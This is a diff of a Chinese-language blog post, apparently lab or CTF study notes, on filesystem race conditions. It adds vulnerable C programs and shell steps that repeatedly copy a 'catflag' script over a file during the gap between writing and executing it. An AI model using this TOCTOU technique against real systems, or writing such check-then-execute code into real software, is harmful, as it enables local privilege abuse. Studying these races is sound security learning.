@@ -10,6 +10,9 @@ comments: true
 - [1. 什么是race condition](#1-什么是race-condition)
 - [2. races in filesystem](#2-races-in-filesystem)
   - [2.1 races in filesystem 原理](#21-races-in-filesystem-原理)
+  - [2.2 提高rece condition成功概率的方法](#22-提高rece-condition成功概率的方法)
+    - [2.2.1 方法一: nice](#221-方法一-nice)
+- [3. processes and threades](#3-processes-and-threades)
 
 
 # 1. 什么是race condition<br>
@@ -44,7 +47,47 @@ comments: true
 ## 2.1 races in filesystem 原理<br>
 文件系统是攻击者能够经常影响的程序环境的一部分。<br>
 利用文件系统实施攻击，本质上是在进程运行时，操控进程运行所需的文件达到利用`race condition`的目的。<br>
+考虑这段代码:<br>
+```c
+int main(int argc, char **argv) {
+    int fd = open(argv[1], O_WRONLY | O_CREAT | O_TRUNC, 0755);//O_TRUNC 标志在打开文件时会丢弃文件原本的内容，即清0
+    write(fd, "#!/bin/sh\necho SAFE\n", 20);
+    close(fd);
+    execl("/bin/sh", "/bin/sh", argv[1], NULL);
+}
+```
+在open打开文件和实际执行/binsh之间存在空窗期可以利用！<br>
+```
+具体利用步骤:
+1. gcc fs1.c -o fs1
+2. 启动一个terminal，运行 for i in $(seq 1 2000); do ./fs1 asdf; done | tee output
+3. 再启动一个terminal， 运行 while /bin/true; do cp -v catflag asdf; done
+4. 运行 sort output | uniq -c 查看运行次数  
+```
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241213210133.png)
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241213211751.png)
 
+## 2.2 提高rece condition成功概率的方法<br>
+考虑如下代码:<br>
+```c
+int main(int argc, char **argv) {
+    int echo_fd = open("/bin/echo", O_RDONLY);
+    int fd = open(argv[1], O_WRONLY | O_CREAT, 0755);
+    sendfile(fd, echo_fd, 0, 1024*1024);
+    close(fd);
+    execl(argv[1], argv[1], "SAFE", NULL);
+}
+//这段代码的空窗期比2.1提到的小得多，主要原因是/bin/sh执行时需要加载很多system call
+```
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241213211831.png)
+这概率小太多了，因此，我们需要提高成功率的方法！<br>
+
+### 2.2.1 方法一: nice<br>
+
+
+
+
+# 3. processes and threades<br>
 
 
 <!-- Google tag (gtag.js) -->
